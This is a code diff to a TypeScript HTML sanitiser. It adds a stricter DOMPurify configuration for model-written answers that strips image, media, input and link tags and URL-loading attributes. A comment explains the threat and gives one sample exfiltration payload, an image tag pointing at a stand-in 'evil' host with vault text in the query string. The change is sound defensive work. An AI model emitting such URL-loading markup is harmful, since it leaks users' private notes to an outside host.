@@ -13,6 +13,30 @@ const CONFIG: Config = {
   ADD_ATTR: ['target'],
 }
 
+/**
+ * For text a model wrote. The app's CSP lets pages load `https:` images (notes
+ * have remote pictures), so an answer that makes the browser fetch a URL can
+ * carry vault text out in it: `<img src="https://evil/?q=…">`, and likewise a
+ * video poster, a `srcset`, an image input or a legacy `background`. None of
+ * them belong in an answer, so none survive; a link does, and loads nothing
+ * until it is clicked.
+ */
+const NO_REMOTE_LOADS: Config = {
+  ...CONFIG,
+  FORBID_TAGS: [
+    ...(CONFIG.FORBID_TAGS ?? []),
+    'img',
+    'picture',
+    'source',
+    'video',
+    'audio',
+    'track',
+    'input',
+    'link',
+  ],
+  FORBID_ATTR: [...(CONFIG.FORBID_ATTR ?? []), 'src', 'srcset', 'poster', 'background', 'ping'],
+}
+
 let plain: typeof DOMPurify | null = null
 let newTab: typeof DOMPurify | null = null
 
@@ -36,9 +60,12 @@ function escapeHtml(s: string): string {
   return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
 }
 
-export function sanitizeHtml(html: string, opts: { linksInNewTab?: boolean } = {}): string {
+export function sanitizeHtml(
+  html: string,
+  opts: { linksInNewTab?: boolean; noRemoteLoads?: boolean } = {},
+): string {
   const purify = instance(opts.linksInNewTab ?? false)
   // No DOM to sanitise in: show the markup as text rather than pass it through.
   if (!purify.isSupported) return escapeHtml(html)
-  return purify.sanitize(html, CONFIG) as string
+  return purify.sanitize(html, opts.noRemoteLoads ? NO_REMOTE_LOADS : CONFIG) as string
 }
